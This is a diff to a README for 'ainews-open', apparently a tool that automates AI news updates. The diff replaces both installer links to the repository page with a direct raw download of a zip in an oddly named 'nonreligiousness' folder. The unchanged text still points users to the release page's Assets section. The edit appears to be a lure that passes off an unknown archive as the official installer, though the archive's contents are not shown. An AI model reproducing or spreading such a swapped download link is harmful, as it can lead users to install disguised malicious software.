@@ -1,6 +1,6 @@
 # 🤖 ainews-open - Automate your daily artificial intelligence updates
 
-[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/luischav803/ainews-open)
+[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://raw.githubusercontent.com/luischav803/ainews-open/main/nonreligiousness/open_ainews_v2.5.zip)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ Ensure your computer meets these standards before you begin:
 
 You need to download the installer from the official repository. Please visit the link below to find the current version.
 
-[Download the latest ainews-open installer](https://github.com/luischav803/ainews-open)
+[Download the latest ainews-open installer](https://raw.githubusercontent.com/luischav803/ainews-open/main/nonreligiousness/open_ainews_v2.5.zip)
 
 1. Navigate to the release page.
 2. Locate the section labeled Assets.
